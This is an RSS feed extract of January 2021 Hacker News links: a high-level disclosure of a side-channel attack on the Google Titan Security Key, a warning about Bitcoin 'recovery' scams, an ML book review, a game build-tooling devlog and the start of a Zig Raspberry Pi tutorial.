<p><span> The <a href="https://store.google.com/product/titan_security_key" target="_blank" rel="noopener noreferrer"><i>Google Titan Security Key</i></a> is a FIDO U2F hardware device proposed by Google (available since July 2018) as a two-factor authentication token to sign in to applications (e.g. your Google account). Our work describes a side-channel attack that targets the <i>Google Titan Security Key</i>’s secure element (the NXP A700X chip) by the observation of its local electromagnetic radiations during ECDSA signatures (the core cryptographic operation of the FIDO U2F protocol). In other words, an attacker can create a clone of a legitimate <i>Google Titan Security Key</i>.</span></p>

<p><span> To understand the NXP ECDSA implementation, find a vulnerability and design a key-recovery attack, we had to make a quick stop on <i>Rhea</i> (NXP J3D081 JavaCard smartcard). Freely available on the web, this product looks very much like the NXP A700X chip and uses the same cryptographic library. <i>Rhea</i>, as an open JavaCard platform, gives us more control to study the ECDSA engine.</span></p>

<p><span> We could then show that the electromagnetic side-channel signal bears partial information about the ECDSA ephemeral key. The sensitive information is recovered with a non-supervised machine learning method and plugged into a customized lattice-based attack scheme.</span></p>

<p><span> Finally, 4000 ECDSA observations were enough to recover the (known) secret key on <i>Rhea</i> and validate our attack process. It was then applied on the <i>Google Titan Security Key</i> with success (this time by using 6000 observations) as we were able to extract the long term ECDSA private key linked to a FIDO U2F account created for the experiment.</span></p>

<h3>Cautionary Note</h3>
<p><span> Two-factor authentication tokens (like FIDO U2F hardware devices) primary goal is to fight phishing attacks. Our attack requires physical access to the <i>Google Titan Security Key</i>, expensive equipment, custom software, and technical skills.</span></p>

<p><span> <b>Thus, as far as our study goes, it is still safer to use your <i>Google Titan Security Key</i> or other impacted products as FIDO U2F two-factor authentication token to sign in to applications rather than not using one.</b></span></p>

<p><span> Nevertheless, this work shows that the <i>Google Titan Security Key</i> (and other impacted products) would not avoid unnoticed security breach by attackers willing to put enough effort into it. Users that face such a threat should probably switch to other FIDO U2F hardware security keys, where no vulnerability has yet been discovered.</span></p>

<h3>Discovered By</h3>
<p><span> Victor lomné (NinjaLab) and Thomas Roche (NinjaLab).<br>
with the help of Camille Mutschler (NinjaLab) and Dr. Laurent Imbert (LIRMM, CNRS).</span></p>

<h3>List of Impacted Products</h3>
<ul>
<li> Google Titan Security Key (all versions) </li>
<li> Yubico Yubikey Neo </li>
<li> Feitian FIDO NFC USB-A / K9 </li>
<li> Feitian MultiPass FIDO / K13 </li>
<li> Feitian ePass FIDO USB-C / K21 </li>
<li> Feitian FIDO NFC USB-C / K40 </li>
<li> NXP J3D081_M59_DF and variants </li>
<li> NXP J3A081 and variants </li>
<li> NXP J2E081_M64 and variants </li>
<li> NXP J3D145_M59 and variants </li>
<li> NXP J3D081_M59 and variants </li>
<li> NXP J3E145_M64 and variants </li>
<li> NXP J3E081_M64_DF and variants </li>
</ul>


<h3>Further Notes</h3>
<p><span>
1. The impacted Yubico Yubikey Neo is an old product no more available for sale. All FIDO U2F Yubico Yubikeys currently available on their webstore are based on a newer secure element from Infineon, and are not impacted by our work to our knowledge.
</span></p>
<p><span>
2. The NXP P5 / SmartMX secure microcontroller family and its associated cryptographic library (up to v2.9) impacted by our work is quite old. Since, NXP has released two new generations of secure microcontroller families, the “NXP P60 / SmartMX2” family and now the “NXP P70 / SmartMX3” family. Both are Common Criteria certified (with recent certification process), and are not impacted by our work to our knowledge.
</span></p>

<h3>CVE</h3>
<p><span> 
We assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3011" target="_blank" rel="noopener noreferrer">CVE-2021-3011</a>
</span></p>
	</div><!--/.blog-post-entry.markup-format-->
</article><!--/#post-747.blog-post-->
			</section><!--/#blog-->
		</div><!--/.col-sm-7-->
			</div><!--/.row-->
</div></div>]]>
            </description>
            <link>https://ninjalab.io/a-side-journey-to-titan/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25675556</guid>
            <pubDate>Thu, 07 Jan 2021 19:00:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Libbpf-rs: eBPF for the Rust ecosystem]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25675109">thread link</a>) | @danobi
<br/>
January 7, 2021 | https://dxuuu.xyz/libbpf-rs.html | <a href="https://web.archive.org/web/*/https://dxuuu.xyz/libbpf-rs.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://dxuuu.xyz/libbpf-rs.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25675109</guid>
            <pubDate>Thu, 07 Jan 2021 18:27:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin Has Passed $40k]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674953">thread link</a>) | @electic
<br/>
January 7, 2021 | https://blockmodo.com/quotes/BTC | <a href="https://web.archive.org/web/*/https://blockmodo.com/quotes/BTC">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://blockmodo.com/quotes/BTC</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674953</guid>
            <pubDate>Thu, 07 Jan 2021 18:17:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Help! My Bitcoin was stolen! Why “Bitcoin recovery” services are scams]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25674723">thread link</a>) | @HeroicLife
<br/>
January 7, 2021 | https://walletrecovery.info/my-bitcoin-was-stolen-can-you-help/ | <a href="https://web.archive.org/web/*/https://walletrecovery.info/my-bitcoin-was-stolen-can-you-help/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Billions of dollars in Bitcoin are stolen every year.&nbsp; If you’re a victim of Bitcoin theft or a scam, read this article first.</p>
<p>I will tell you why most “recovery” services are scams, and what you should actually do.</p>
<h3><strong>Can a Bitcoin recovery service help get my stolen Bitcoin/Ethereum/etc back?</strong></h3>
<p>The first and most important thing you should know is <strong>that there is absolutely no way to reverse confirmed Bitcoin/cryptocurrency transactions</strong>.&nbsp; Once a transaction is confirmed on the Blockchain, there is no way to reverse it.</p>
<p><strong>Beware of “Bitcoin recovery” scams</strong></p>
<p>There are many “Bitcoin recovery” services that claim to be able to return stolen Bitcoin.&nbsp; They will have all kinds of explanations of how they do this.</p>
<p>Here is a debunking of the most common recovery methods:</p>
<h3><strong>Lawyers:&nbsp;</strong></h3>
<p><strong>What they promise: </strong>we will prosecute thieves and force them to return stolen Bitcoin</p>
<p><strong>Why it won’t work:&nbsp;</strong></p>
<p>In almost all cases, you won’t know the identity of the people who stole your Bitcoin. It’s nearly impossible to find out the real-world identity of the owner of a given Bitcoin address.</p>
<p>Even if you have a name, email address, “registered trading account,” website, etc, it will be very difficult to obtain the cooperation of the police in getting their real-world identity.</p>
<p>The police don’t care about “small scale” theft. In most cases, the thieves will be in a different country than you.&nbsp; Furthermore, unlike cash, there is no paper trail to follow.&nbsp; Bitcoin/cryptocurrency is generally considered “property” rather than money, and hacking isn’t given the same weight as theft of physical goods.&nbsp; All of this makes authorities unlikely to pursue cases.</p>
<p>Even when the identity of the thieves is definitely known, the Bitcoin is rarely returned. The only cases where Bitcoin has been recovered in theft has been in a class-action lawsuit (such as with Mt Gox). Even then, it usually takes thousands of victims, at least tens of millions of dollars stolen, expensive attorneys, and many years.</p>
<p>I’m not saying it’s impossible. Just don’t expect to send a random lawyer $5000-$10,000 (typical “recovery” fees) and anything useful to happen. It’s a scam.</p>
<h3><strong>“Ethical hackers”</strong></h3>
<p><strong>What they promise:</strong> we will hack the thieves and get them to return your Bitcoin.</p>
<p><strong>Why it won’t work:</strong></p>
<p>First, anyone who was able to steal your money is already a sophisticated hacker. Most “hackers” prey on the technologically ignorant.&nbsp; Anyone capable of stealing your Bitcoin probably knows the tricks of so-called “ethical hackers”.</p>
<p>Second, it’s nearly impossible to find out the real-world identity from a Bitcoin address or an email address.&nbsp; If the U.S. government struggles to find find out who operates darknet markets, what hope has some hacker you paid $1000?</p>
<p>Third, even an “ethical hacker” has to break into someone else’s systems — and probably break some laws in the process. If they could someone break into people’s computers to get their Bitcoin, why should they return it to you?&nbsp; Why do they need you at all?&nbsp; If they can hack people’s computers to steal Bitcoin, they are just as likely to steal yours.</p>
<p>There are no credible, independent reports of anyone successfully doing this. “Ethical hackers” that return Bitcoin for cash upfront simply do not exist.&nbsp; It’s a scam.</p>
<h3><strong>Blockchain hackers</strong></h3>
<p><strong>What they promise:</strong> we will hack Bitcoin or brute force your private key to reverse the transaction and return your Bitcoin.</p>
<p><strong>Why it won’t work:</strong></p>
<p>The market cap of Bitcoin is nearly $700 billion dollars.&nbsp; Every single Bitcoin transaction and address is public.&nbsp; If someone could steal or reverse a Bitcoin transaction, they wouldn’t be helping you.&nbsp; <a href="https://99bitcoins.com/bitcoin/rich-list/">They would be going after the richest Bitcoin wallets worth tens of billions of dollars.</a> Of course, once it got out that Bitcoin could be hacked, the exploit would either be patched, or Bitcoin would become worthless.</p>
<p>No matter how brilliant they claim to be, it’s a scam.</p>
<h3><strong>Chainalysis</strong></h3>
<p><strong>What they claim:</strong> we will trace Bitcoin transaction to the service holding them, and force them to return your money.</p>
<p><strong>Why it won’t work:</strong></p>
<p>Chainalysis is a real thing.&nbsp; <a href="https://www.chainalysis.com/">There are companies</a> that keep databases of addresses used by criminals and gambling sites, and help exchanges ban those customers.&nbsp;&nbsp;Unfortunately, they can’t help you for a few reasons:</p>
<p>First, they have expensive products for businesses and governments than the random recovery service you found online probably doesn’t have access to.</p>
<p>Second, the most they can do is trace which major exchange or business got your Bitcoin.&nbsp; At this point, you would need the cooperation of the exchange to tell you which customer made that deposit.&nbsp; That cooperation is impossible to obtain without a court order, which as previously explained is nearly impossible to obtain.&nbsp; Furthermore, thieves don’t use cooperative exchanges in the first place, since they require <a href="https://www.wikiwand.com/en/Know_your_customer">KYC. </a>If they want to cash out, they are going to use some less-reputable service in a country that probably does not cooperate with your government.</p>
<p>Third, once your crypto hits an exchange, it’s impossible to trace what a given customer does with it next.&nbsp; If someone simply deposits Bitcoin with an exchange, you will never know when they take it out or move it.&nbsp; This is because exchanges combine all their funds, so your stolen Bitcoin will be given to whoever requests a withdrawal first.&nbsp; It will not be withdrawn by the person who deposited it.</p>
<p>Fourth, criminals don’t keep Bitcoin at exchanges.&nbsp; In my experience, they will either sit on it for years or cash it out immediately. They are not stupid enough to keep it where it can be confiscated, however unlikely that is.</p>
<p>It’s a scam.</p>
<h3><strong>Conclusion:&nbsp;</strong></h3>
<p>It is nearly impossible to return your stolen cryptocurrency.&nbsp; Don’t lose more of your money in vain.</p>
<p><strong>Am I wrong?&nbsp; Are there other “recovery” methods I forgot to mention? Please let me know below.</strong></p>
<h3><strong>So what should I do?</strong></h3>
<p>First, there is a small qualification that <strong>unconfirmed transactions can be reversed or canceled</strong>.&nbsp; In a few cases, I’ve been able to reverse transactions that haven’t confirmed yet.&nbsp; It’s rare and requires immediate action.&nbsp; Usually, this happens with wallets that receive mining payments, as they require much higher fees to confirm.</p>
<p>Second, if your Bitcoin keys, logins, seed, etc have been leaked or exposed, but the thieves have not yet sent it away, you must act <strong>immediately&nbsp;</strong>to transfer it to a new private wallet.</p>
<p>Third, realize that if someone has stolen your Bitcoin, you may still be vulnerable to theft. You probably did something wrong or were exploited by someone who can do it again.</p>
<p>Don’t go out and buy more Bitcoin.&nbsp; You need to <a href="https://walletrecovery.info/ten-essential-security-practices-to-keep-your-bitcoin-safe/">perform a security audit</a> to understand how it was stolen. You may have a keylogger tracking all your keystrokes, or a root exploit that allows someone to access all your files.&nbsp; Educate yourself. Learn about <a href="https://walletrecovery.info/watch-out-for-these-five-common-bitcoin-cryptocurrency-scams/">the most common cryptocurrency scams</a>. At a minimum,&nbsp; <a href="https://walletrecovery.info/how-to-safely-store-bitcoin-and-other-cryptocurrencies/">read my article on how to safely store Bitcoin</a>.</p>
<p>Fourth, make sure your crypto was really stolen.&nbsp; You should see a transaction to an address that does not belong to you on a date/time you did not make any transactions.&nbsp;&nbsp;<strong><a href="https://walletrecovery.info/contact-us/">If you’re not sure, ask for help</a></strong>.&nbsp; If you don’t see an outgoing transaction, it was probably not stolen – you’re doing something wrong.</p>
<p>Fifth, if your Bitcoin was stolen, and you held it before August 2017, check to see if the BCH/BSV forks have been claimed.&nbsp; Do this immediately, before the crooks do.</p>
 </div></div>]]>
            </description>
            <link>https://walletrecovery.info/my-bitcoin-was-stolen-can-you-help/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674723</guid>
            <pubDate>Thu, 07 Jan 2021 18:04:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: Machine Learning Design Patterns]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674710">thread link</a>) | @cl42
<br/>
January 7, 2021 | https://phaseai.com/resources/machine-learning-design-patterns | <a href="https://web.archive.org/web/*/https://phaseai.com/resources/machine-learning-design-patterns">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

     
     <p><i>By Wojciech Gryc on January 6, 2021</i>
     
     </p><p><i>TLDR:</i> This book is a fantastic introduction to the terminology and architecture options for building ML-driven products and services. If you are new to the field or are a technology leader who needs to brush up on their ML terminology and options, then this book is for you. Experts in the field looking to innovate on model performance might want to look elsewhere.
     
     </p><hr>
     
     <p>An oft-overlooked area of data science is the actual architecture of machine learning systems. It’s easy to get excited about the latest algorithms and ML packages, but broader <i>operationalization</i> of the system is taken for granted. If you are a data scientist aspiring to work in product with companies shipping productized ML models, then <a href="https://learning.oreilly.com/library/view/machine-learning-design/9781098115777/" target="_blank"><i>Machine Learning Design Patterns</i></a> is worth a perusal.
     
     </p><p>The book addresses an issue that we at Phase AI see constantly: terminology in this space is still new, and the way we describe design patterns – let alone use them – is inconsistent. Worse still, a poorly architected ML product could introduce so many problems down that line that it all but guarantees failure for a startup or product launch. It’s wonderful to see the authors try and address this.

     </p><p>The majority of the book (chapters 2 through 7) provides an overview of common approaches to discussing and addressing machine learning problems. This includes data ingestion, cleaning, modeling, and even the ethics of AI. Each chapter has a set important terms and approaches (i.e., the design patterns); it provides definitions for the design pattern, and examples of how one can implement the design pattern and address common issues with it.

     </p><p>Let’s look at data preparation (Chapter 2, <i>Data Representation Design Patterns</i>) as an example. The authors provide an overview of how different types of variables can be represented for machine learning problems. This includes concepts like one-hot encoding, feature embedding, multimodal inputs, and more. One can write 1000s of pages on the topics in each chapter, so this is really more about terminology and a general introduction.

     </p><p>In addition to standardization of terminology, the book presents helpful diagrams on how to structure ML-driven products and pipelines. Figure 8-5, shown below, is a good example of this. These diagrams are critical to understanding the architecture and design patterns powering ML projects, and I hope more VPs of Engineering and Architecture document, review, and promote such diagrams within their ML-driven product and service organizations… Such documentation is the only way architecture principles will maintain their integrity as teams scale and team members come and go.<br>&nbsp;

    </p><center><img src="https://phaseai.com/static/img/scr-ml-design-pattern.png"><br><i>Figure 8-5 showing how to build out an end-to-end ML architecture and pipeline, from data exploration to providing a full model in production.</i><br>&nbsp;</center>
    
    <p>My biggest qualm with the book is that much of it is spent laying the groundwork for the field, and as such, only one chapter focuses on how the design patterns in this book could be used for building solutions to common problems. I would love to see a few chapters dedicated to in-depth analysis of architectures (or options) for performant product recommendation systems, or a fraud model at a bank, or something else. This could be a good opportunity for a sequel.

    </p><p>The question remains, however: who is this book for? If you are just learning ML or data science, you might benefit from a skim, but I would suggest you focus on learning the core skills of data science. If you are now entering the world of product management, architecting solutions, or leading an ML team, then these concepts are vital; if you are not familiar with them, then this is a good place to start. Similarly, if you are a technology manager or leader who doesn’t have much experience with ML, then this book will provide a nice foundation for your work.

     </p></div></div>]]>
            </description>
            <link>https://phaseai.com/resources/machine-learning-design-patterns</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674710</guid>
            <pubDate>Thu, 07 Jan 2021 18:02:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Will Trump be suspended from Twitter before April 1, 2021?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674580">thread link</a>) | @donut2d
<br/>
January 7, 2021 | https://polymarket.com/market/will-president-trump-be-suspended-from-twitter-before-april-1-2021 | <a href="https://web.archive.org/web/*/https://polymarket.com/market/will-president-trump-be-suspended-from-twitter-before-april-1-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://polymarket.com/market/will-president-trump-be-suspended-from-twitter-before-april-1-2021</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674580</guid>
            <pubDate>Thu, 07 Jan 2021 17:56:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build tools for a multiplayer browser game]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674273">thread link</a>) | @todsacerdoti
<br/>
January 7, 2021 | https://jeffanddom.com/devlog/2021-01-07-how-jeff-and-dom-make-the-game/ | <a href="https://web.archive.org/web/*/https://jeffanddom.com/devlog/2021-01-07-how-jeff-and-dom-make-the-game/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Holy heck, it’s January! Congrats to everyone for making it to 2021.</p>
<p><img src="https://paper-attachments.dropbox.com/s_2D26CFCFC1A50FAAA131CE2FDABB0884BD80263FA1E7E2924E10BB4715669F45_1609724615677_Screen+Shot+2021-01-03+at+5.43.00+PM.png"></p>
<p><a href="https://github.com/jeffanddom/manchester">Manchester</a> (the working title for our current project) is still more tech demo than game, but it’s come a really long way in the past six months. We’ve arrived at a multiplayer architecture that seems pretty workable, and for the past month we’ve been converting the game to 3D, throwing out most of the old rendering code in the process. More importantly, Dom and I are finally getting our sea legs. We started off being pretty clueless about everything, but we’ve managed to build up a little foundation of knowledge about how these systems work and how they fit together, and we’re hoping to post more articles about all the stuff we’ve learned.</p>
<p>This post explores some of the tools we use to build and develop the game. We’re using borrowed 3D models and don’t have a complex asset pipeline, so this mostly concerns how we convert TypeScript source into a playable game, and how that fits into our development workflow.</p>
<p>One interesting problem with building Manchester is that it’s actually two different programs, a client and a server. The client runs in the browser, the server runs via the Node runtime, and the two talk to each other over a websocket. While each program has some exclusive capabilities (only the client can use WebGL, for example), both can run the full game simulation. As a result, they share a lot of code, but they aren’t identical artifacts.</p>
<p><img src="https://paper-attachments.dropbox.com/s_2D26CFCFC1A50FAAA131CE2FDABB0884BD80263FA1E7E2924E10BB4715669F45_1609722621165_Screen+Shot+2021-01-03+at+5.10.13+PM.png"></p>
<p>At the most basic level, our build system converts the game’s TypeScript to JavaScript, and assembles the resulting JavaScript files into a couple of asset bundles that run in different runtime environments. But we also rely on the build system to provide a tight edit-build-reload loop, so we can iterate on game features without getting distracted with manual drudgery and long build times. This means that the build system also has to rebuild and reload the game automatically in response to changes, and it has to do those things fairly quickly.</p>
<h2>Bundling code as fast as possible</h2>
<p>Until very recently, we used <a href="https://parceljs.org/">Parcel</a> to generate both the client and server bundles. Parcel has pretty sensible default behavior, which reduces the amount of customization you have to do. Its API also largely avoids being a soup of abstractions, so when you do have to customize, it’s not that hard. The first time I ever used it, it seemed quite magical when compared to the stodgy unfriendliness of Webpack.</p>
<p>To build a client and server versions of the game, we just point Parcel at two different “entrypoint” files, and set a single flag for each indicating whether we’re targeting the browser or Node. Parcel then recursively traverses the import statements for each entrypoint and spits out two different bundles, ready for runtime.</p>
<p>Unfortunately, Parcel is pretty slow. I’m skeptical that it was ever as “blazing fast” as its website claims. Manchester is currently around 8000 lines of TypeScript not counting comments, which is to say not very big at all. A clean Parcel build takes over 20 seconds on my 2017 MacBook Pro. Incremental builds are better, maybe between 5-10 seconds, which is tolerable but far from snappy. It’s hard to imagine good outcomes as we add more stuff—the codebase might be several times its current size if we get anywhere close to what we’re hoping to do.</p>
<p>Lately, a lot of new JavaScript tools seem to be popping up on the radar, all reflecting a philosophy of chucking the last decade’s worth of received wisdom around frontend tooling. You’ve got <a href="https://esbuild.github.io/">esbuild</a> and <a href="https://github.com/swc-project/swc">swc</a>, two transpiling bundlers written in Go and Rust respectively, that both abandon the age-old tradition of implementing JavaScript tooling in JavaScript itself. Then there’s <a href="https://rome.tools/">Rome</a>, which doesn’t ditch JavaScript as an implementation language, but appears to ditch just about everything else in the conventional JS toolchain.</p>
<p>Despite the grand promises of these new tools, I’d always avoided trying to replace Parcel—it seemed like it would be painful to change such a core piece of the build, especially if the alternatives weren’t fully baked. But while researching this post, I set aside a little time to give esbuild a shot. Just a tiny toe-dip to see what the water felt like.</p>
<p>The results were <em>staggering</em>. In less than an hour, I <a href="https://github.com/jeffanddom/manchester/commit/97d2b86b9b8158845236267efcca2d2c0c8cfcbc">merged a change</a> that replaced Parcel with esbuild, yielding build times that feel pretty darn close to the <a href="https://esbuild.github.io/faq/#why-is-esbuild-fast">two-order-of-magnitude speedup</a> advertised on esbuild’s website. I didn’t do any profiling except to observe that the build is now essentially instantaneous. It makes me feel like the community should strongly consider not using JavaScript anymore for writing nontrivial tools. Yes, I’m looking at you, official TypeScript typechecker!</p>
<p><img src="https://paper-attachments.dropbox.com/s_2D26CFCFC1A50FAAA131CE2FDABB0884BD80263FA1E7E2924E10BB4715669F45_1609720604373_Screen+Shot+2021-01-03+at+4.36.39+PM.png"></p>
<p>Almost as impressive as the performance gain was the ease of migration. Our requirements aren’t really that demanding, but I honestly expected to hit some annoying snag that would cause me to drop the whole idea immediately. Instead, what I got was a near drop-in replacement. We have fewer lines of code dedicated to esbuild than we did to Parcel. I’m guessing esbuild enjoys the latecomer’s advantage of emulating the patterns of its predecessors, and maybe avoiding their anti-patterns too.</p>
<h2>Development server</h2>
<p>With bundling out the way, the next thing to address is getting code changes to automatically trigger rebuilds. Most bundler systems, Parcel and esbuild included, give you a “development server” that runs in a terminal tab, watching your code for changes and rebuilding the project when appropriate. Some tools will even automatically reload programs running in the browser, so you don’t have to.</p>
<p>For a while, we were quite happily chugging away with Parcel’s version of this. This changed when Manchester became a multiplayer game, and we had to run a Node server on top of the browser client. Suddenly, we had two artifacts to build, and on top of that, we needed the server piece to be able to deliver the client artifact over HTTP.</p>
<p>I tried and failed to find a bundler with a dev server that makes this arrangement seem even remotely doable. Rather than try to bend someone else’s dev server to our will, we decided just to write our own. Manchester’s homegrown <a href="https://github.com/jeffanddom/manchester/blob/9efb11e163b3919a9759984a1e52aa8d67e7272c/src/cli/build/dev.ts">dev server</a> acts as a supervisor for three processes: a <a href="https://github.com/jeffanddom/manchester/blob/main/src/cli/build/buildClient.ts">client bundler</a>, a <a href="https://github.com/jeffanddom/manchester/blob/9efb11e163b3919a9759984a1e52aa8d67e7272c/src/cli/build/buildServer.ts">server bundler</a>, and the game server itself. It listens to our source directory for file change events, and when they occur, it runs the bundlers to produce new artifacts. When both are done, it restarts the game server.</p>
<p><img src="https://paper-attachments.dropbox.com/s_2D26CFCFC1A50FAAA131CE2FDABB0884BD80263FA1E7E2924E10BB4715669F45_1609723042125_Screen+Shot+2021-01-03+at+5.17.10+PM.png"></p>
<p>The dev server does all of the above in a very literal, straightforward fashion, and when I reflect on similar projects I worked on in the past—i.e., a JS client and Node server that share code and talk to each other—I wish I’d been willing to take this route earlier. That said, there are a couple of interesting gotchas to call out.</p>
<p>First, when triggering actions off of high-frequency events like file system changes, it’s important to do some debouncing. This means that instead of triggering a build as soon you receive a file system event, you can schedule a build a short time into the future. If you receive a subsequent event, you can check to see if a build is already scheduled, and if so, ignore the new event. I found this surprisingly subtle to get right, but it’s a useful pattern to have in the bag. Any UI that handles mouse clicks and keypresses (like a video game!) is likely to need some debouncing in order to be tolerable to the user.</p>
<p>Second, while it’s good to avoid adding dependencies when they’re not absolutely necessary, I recommend using <a href="https://www.npmjs.com/package/chokidar">chokidar</a> if you’re using JavaScript and are in the business of subscribing to file system events. Node’s standard library seems to offer a nice, simple solution in <a href="https://nodejs.org/api/fs.html#fs_fs_watch_filename_options_listener">fs.watch</a>, but it <a href="https://nodejs.org/api/fs.html#fs_caveats">doesn’t actually work on Linux</a>, which seems kind of like a big deal.</p>
<h2>Auto-restarting the client</h2>
<p>So, we’ve got a dev server that can rebuild artifacts and restart the game server. However, it can’t talk to the client running in a browser tab, so it doesn’t have a direct way to restart the client.</p>
<p>We solve this by letting the client poll the game server every few seconds to see if there’s a new build available. The game server already serves the client artifact via HTTP, so it knows when a new client artifact has been generated by the bundler. If the server reports a different build version to what the client is running, the client triggers a page reload.</p>
<p><img src="https://jeffanddom.com/img/devlog/20210104-autoreload.gif"></p>
<p>Our concept of a “build version” is pretty basic: it’s just a timestamp of when a build was triggered. There’s probably a content-addressable version of this, a CRC or something, that offers optimal correctness, but a timestamp is easy to generate and works just fine. Before creating the client bundle, the dev server writes the build version into a string that gets rolled into the client code. In other words, each client artifact is hard-coded with its build version. The dev server also writes the build version to a file that the game server can read, so the game server knows how to respond the next time the client asks for the current build version.</p>
<p>Right now, neither the client nor the server has any persistent state, so a full reload on both sides is the most we can do. Which is nice and simple! Once the game gets deeper, though, we’re probably going to need more complex semantics around what it means to “reload”, and maybe have different types of reloads depending on what kind of changes were made in the build. It seems like a hard thing to get right. A lot of in-development games don’t bother systematizing this kind of thing, and instead just make it easy for the developer to jump around once the game has reloaded, via debug menus, cheat codes, etc.</p>
<h2>Developing in the cloud</h2>
<p>In addition to replacing Parcel, we also looked into improving build performance the old-fashioned way: throwing more hardware at the problem. During one of our Twitch streams, we run not only the development server, but a slew of other resource-hungry programs: the game server, the game client, …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jeffanddom.com/devlog/2021-01-07-how-jeff-and-dom-make-the-game/">https://jeffanddom.com/devlog/2021-01-07-how-jeff-and-dom-make-the-game/</a></em></p>]]>
            </description>
            <link>https://jeffanddom.com/devlog/2021-01-07-how-jeff-and-dom-make-the-game/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25674273</guid>
            <pubDate>Thu, 07 Jan 2021 17:37:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gettin' Ziggy with It on the Pi Zero]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25674206">thread link</a>) | @jorangreef
<br/>
January 7, 2021 | https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/ | <a href="https://web.archive.org/web/*/https://www.kamelasa.dev/programming/gettin-ziggy-with-it-pi-zero/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <header>
          <p><a href="https://www.kamelasa.dev/">kamelåså</a>
            <span>special topics in calamity something or other</span>
          </p>
        </header>
        
      </div>
    </div><div><article>
    

    <section>
        <p>Alright, you can read the article first and shoot me later for a title like that, and what will inevitably become a series of Zig-based puns.</p>
<p>Zig, for the unaware, is a fancy language that looks to be to C what Rust is to C++. Honestly, I recommend you read the summary on the main page<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a> to find out more yourself, as the best I can do is to just parrot what has already been written. However, you can see it as a valid <em>alternative</em> to C and Zig itself has claimed that it wants to be a better version of C than C itself. An ambitious challenge, for sure. To that end, Zig itself ships its own C compiler.</p>
<p>I’ve been interested in giving Zig a spin for quite a while, and once my Raspberry Pi Zero W<a href="#fn2" id="fnref2" role="doc-noteref"><sup>2</sup></a> and OLED display<a href="#fn3" id="fnref3" role="doc-noteref"><sup>3</sup></a> arrived in the post, I decided that this would be my best opportunity to try it out. I’m not really going to cover the process of wiring up the hardware, suffice to say that once you’ve got your Pi Zero you’ll need to be able to SSH into it, and that you’ll need a [solderless] GPIO header<a href="#fn4" id="fnref4" role="doc-noteref"><sup>4</sup></a> to plug the OLED display into. I recommend the Zero <strong>W</strong> because the W means ‘WiFi’, which means that if you connect it to your network you can SSH in without faffing around with USB cables and what not. It’s not a requirement, though.</p>
<p>With that out of the way, let’s see if we can write something in Zig to power this little display. It’s going to be a simple program that simply fills the entire screen by turning the pixels from black (off) to white (on). As an extra challenge, we will do this without pulling in dependencies like WiringPi<a href="#fn5" id="fnref5" role="doc-noteref"><sup>5</sup></a>, or relying on existing drivers, as lovely as they are.</p>
<p>Instead, we will be directly using the i<sup>2</sup>c dev interface<a href="#fn6" id="fnref6" role="doc-noteref"><sup>6</sup></a>. If you’re using Debian and/or Ubuntu on your Pi and your own machine, you can grab these libraries with a simple <code>sudo apt install i2c-dev</code>. You will need to enable i<sup>2</sup>c on your Pi separately though, through <code>sudo raspi-config</code><a href="#fn7" id="fnref7" role="doc-noteref"><sup>7</sup></a>.</p>
<p>Ready to… get Ziggy with it? Oh, I bet you are. 😋 If you want to skip to the end and just grab the code, though, you can find this all on GitHub<a href="#fn8" id="fnref8" role="doc-noteref"><sup>8</sup></a>. I called it Stardust, like <em>Zig</em>gy Stardust. Get it?</p>
<p>🥁</p>
<hr>
<h2 id="hello-pi.">Hello, Pi.</h2>
<p>The first and most complicated part of any low-level project is the bit where you try and establish a build system of some sorts. We’re going to forget about that completely for now and apply some elbow-grease to the situation.</p>
<p>The next step is to define a <code>main</code> function that grabs a file descriptor (or handle) corresponding to our OLED display. According to the aforementioned dev interface docs, we’ll need to open a file and check it with <code>ioctl</code>.</p>
<pre><code>const std = @import("std");

const c = @cImport({
  @cInclude("linux/i2c.h");
  @cInclude("linux/i2c-dev.h");
  @cInclude("sys/ioctl.h");
});

const i2c_device = "/dev/i2c-1"; // this is assumed correct on a Pi Zero, but may be i2c-0 on an older Pi.
const i2c_addr: c_int = 0x3c; // this is typed as a C-style int for ABI compatibility with C

pub fn main() !void {
  const stdout = std.io.getStdOut().outStream();

